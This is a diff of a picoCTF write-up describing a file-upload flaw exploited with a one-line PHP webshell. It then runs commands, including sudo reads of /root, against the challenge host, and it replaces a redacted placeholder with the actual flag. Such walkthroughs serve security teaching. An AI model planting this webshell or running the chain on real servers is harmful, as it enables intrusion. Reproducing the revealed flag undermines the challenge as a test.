@@ -42,7 +42,7 @@ We created a simple PHP shell:
 ```php
 <?php system($_REQUEST['cmd']); ?>
 ```
-Saved it as `upload.php` and uploaded it successfully.
+Saved it as `upload.php` or any name you want and uploaded it successfully.
 
 📸 Screenshot:
 
@@ -58,7 +58,7 @@ uploads/upload.php
 ### 4️⃣ Execute Commands via Webshell
 By visiting:
 ```
-uploads/upload.php?cmd=ls -lah
+http://standard-pizzas.picoctf.net:57877/uploads/upload.php?cmd=ls -lah
 ```
 We could run arbitrary commands on the server 🎉
 
@@ -79,9 +79,20 @@ This means the user `www-data` has **full root privileges without a password** (
 
 So we can run:
 ```
-uploads/upload.php?cmd=sudo ls -lah /root
+http://standard-pizzas.picoctf.net:57877/uploads/upload.php?cmd=sudo ls -ah /root
 ```
-and gain access to the protected flag!
+<img width="614" height="106" alt="image" src="https://github.com/user-attachments/assets/b9fddeab-d8d1-4071-9a32-97ba23084cb3" />
+
+Look, a flag.txt appeared 🏴
+
+### 6️⃣ The Grand Finale 🏁
+To claim the treasure:
+```
+http://standard-pizzas.picoctf.net:57877/uploads/upload.php?cmd=sudo cat /root/flag.txt
+```
+<img width="1011" height="105" alt="image" src="https://github.com/user-attachments/assets/d1a59b33-ec64-4d86-bbf0-35461e26d15b" />
+💡 And there it was:
+picoCTF{wh47_c4n_u_d0_wPHP_075b4e66}
 
 ---
 
@@ -101,7 +112,7 @@ and gain access to the protected flag!
 
 ## 🎯 Flag
 ```
-picoCTF{<redacted_flag_here_for_example>}
+picoCTF{wh47_c4n_u_d0_wPHP_075b4e66}
 ```
 
 🌀 Game over — full pwn achieved!
